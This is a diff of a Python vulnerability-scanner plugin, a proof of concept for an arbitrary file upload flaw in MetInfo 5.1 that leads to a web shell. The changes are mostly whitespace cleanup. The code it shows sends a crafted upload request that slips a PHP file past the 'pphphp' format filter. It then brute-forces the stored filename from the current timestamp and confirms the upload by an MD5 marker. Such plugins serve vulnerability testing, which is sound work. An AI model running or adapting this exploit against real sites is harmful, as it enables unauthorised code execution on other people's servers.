@@ -3,15 +3,15 @@
 
 
 #Author:wonderkun
-#Name: MetInfo5.1任意文件上传getshell 
-#Refer:http://www.wooyun.org/bugs/wooyun-2015-0139168 
-#Data:2015/12/15  
+#Name: MetInfo5.1任意文件上传getshell
+#Refer:http://www.wooyun.org/bugs/wooyun-2015-0139168
+#Data:2015/12/15
 
-import time 
+import time
 
 def assign(service,arg):
     if service=="metinfo":
-        return True,arg 
+        return True,arg
 
 def audit(arg):
     url=arg+"feedback/uploadfile_save.php?met_file_format=pphphp&met_file_maxsize=9999&lang=metinfo"
@@ -48,9 +48,9 @@ Content-Type: application/x-php
     '''
     #proxy=('127.0.0.1',8080)
     code,head,res,errcode,finalurl=curl.curl2(url,raw=raw)
-    #upload  file 
+    #upload  file
 
-    #get upload file name  
+    #get upload file name
     name=int(time.time())
     for i in range(100,10000):
         filename=name+i
@@ -59,7 +59,7 @@ Content-Type: application/x-php
         code,head,res,errcode,finalurl=curl.curl2(url)
         if code==200 and "c4ca4238a0b923820dcc509a6f75849b" in res :
             security_hole('file upload Vulnerable:'+arg+"feedback/uploadfile_save.php?met_file_format=pphphp&met_file_maxsize=9999&lang=metinfo")
-            break 
+            return arg
 if  __name__ == '__main__':
     from dummy import *
     audit(assign("metinfo","http://www.example.com/")[1])  #没找到测试网站 本地搭建环境测试的
